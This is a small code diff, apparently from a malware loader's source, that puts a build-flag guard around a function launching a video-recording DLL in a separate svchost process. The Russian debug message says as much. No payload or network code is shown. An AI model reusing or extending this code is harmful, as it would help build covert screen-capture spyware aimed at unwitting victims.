@@ -139,8 +139,12 @@ BOOL RunLoaderRoutine()
 
 BOOL RunVideoProcess()
 {
-	MDBG( "Main", "Запуск видеодлл в отдельном свцхосте" );
-	return MegaJump( VideoProcess::StartSvchost );
+	#ifdef VideoRecorderH
+		MDBG( "Main", "Запуск видеодлл в отдельном свцхосте" );
+		return MegaJump( VideoProcess::StartSvchost );
+	#else
+		return FALSE;
+	#endif
 }
 
 DWORD WINAPI LoaderRoutine( LPVOID lpData )
